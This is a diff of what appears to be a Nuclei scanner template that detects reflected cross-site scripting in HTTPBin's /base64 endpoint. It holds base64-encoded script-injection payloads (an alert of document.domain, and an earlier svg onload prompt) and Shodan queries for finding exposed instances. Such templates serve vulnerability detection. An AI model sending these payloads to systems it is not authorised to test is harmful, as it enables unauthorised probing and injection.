@@ -1,15 +1,28 @@
 id: httpbin-xss
 info:
-  name: HTTPBin XSS Vulnerability
+  name: HTTPBin - Cross Site Scripting
   author: Adam Crosser
-  severity: info
-  tags: panel
+  severity: medium
+  reference: https://github.com/postmanlabs/httpbin
+  metadata:
+    shodan-query:
+      - html:"https://github.com/requests/httpbin"
+      - title:"httpbin.org"
+  tags: xss,httpbin,oss
 requests:
   - method: GET
     path:
-      - '{{BaseURL}}/base64/ZXhhbXBsZS5vcmciPjxzdmcvb25sb2FkPXByb21wdCgneHNzJyk+'
+      - '{{BaseURL}}/base64/PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+'
     matchers-condition: and
     matchers:
+      - type: regex
+        part: body
+        regex:
+          - '^<script>alert\(document.domain\)</script>$'
       - type: word
+        part: header
         words:
-          - "<svg/onload=prompt('xss')>"
+          - text/html
+      - type: status
+        status:
+          - 200
